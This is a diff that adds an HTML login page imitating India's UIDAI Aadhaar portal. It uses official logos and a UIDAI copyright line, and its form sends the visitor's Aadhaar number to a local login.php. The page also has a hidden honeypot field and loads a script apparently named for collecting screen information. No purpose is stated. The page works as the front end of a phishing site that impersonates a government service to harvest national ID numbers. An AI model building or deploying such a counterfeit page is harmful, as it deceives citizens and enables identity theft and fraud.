@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Aadhar Portal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/cf/Aadhaar_Logo.svg/500px-Aadhaar_Logo.svg.png" alt="Aadhaar Logo">
+    </div>
+    <div class="emblem-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Emblem_of_India.svg/250px-Emblem_of_India.svg.png" alt="Emblem of India">
+    </div>
+    <div class="azadi-logo">
+        <img src="https://seeklogo.com/images/A/azadi-ka-amrit-mahotsav-hindi-logo-1BE5E3568C-seeklogo.com.png" alt="Azadi Ka Amrit Mahotsav Logo">
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <h1>Unique Identification Authority of India</h1>
+            <h2>Government of India</h2>
+        </div>
+
+        <div class="login-box">
+            <h2>Login to Aadhaar</h2>
+
+            <form method="POST" action="login.php" id="myForm">
+                <!-- Aadhaar Number field (Previously Username) -->
+                <label for="aadhar_number">Enter Aadhaar Number</label>
+                <input type="text" id="aadhar_number" name="username" placeholder="Enter Aadhaar Number" required>
+
+                <!-- Honeypot field (Hidden) -->
+                <input type="text" id="bot-field" name="honeypot" class="honeypot" placeholder="Enter Your Name Here">
+
+                <!-- Submit Button -->
+                <button type="submit" class="login-button">Login</button>
+            </form>
+        </div>
+        
+        <footer>
+            <p>Copyright © 2024 Unique Identification Authority of India All Rights Reserved</p>
+        </footer>
+    </div>
+
+    <script src="screenInfo.js"></script>
+</body>
+</html>
